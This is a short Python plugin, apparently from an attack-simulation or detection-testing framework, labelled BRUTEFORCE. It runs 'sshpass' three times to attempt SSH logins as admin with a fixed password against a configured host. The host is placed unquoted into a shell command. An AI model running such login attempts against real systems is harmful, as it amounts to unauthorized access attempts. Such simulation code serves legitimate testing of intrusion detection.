import Util,os 

class exploit(object):
    def __init__(self):
        self.Name = "BRUTEFORCE"
        self.Description = "Multiple SSH login attempts with wrong admin credentials"
        self.Author = "Rens van der Linden"
        self.Version = "0.2"
        self.POC = ""
        self.Type = Util.Type.Remote
        self.Platform = Util.Platform.Linux

        self.HOST = None
        self.PORT = None


    def exploit(self):
        for _ in range(3):
            os.system(f"sshpass -p P@ssw0rd ssh admin@{self.HOST}")

    def _validate(self):
        if(self.HOST == None):
            print(f"[{self.Name}] No valid parameters.")
            exit(1)


    def run(self):
        self._validate()
        self.exploit()
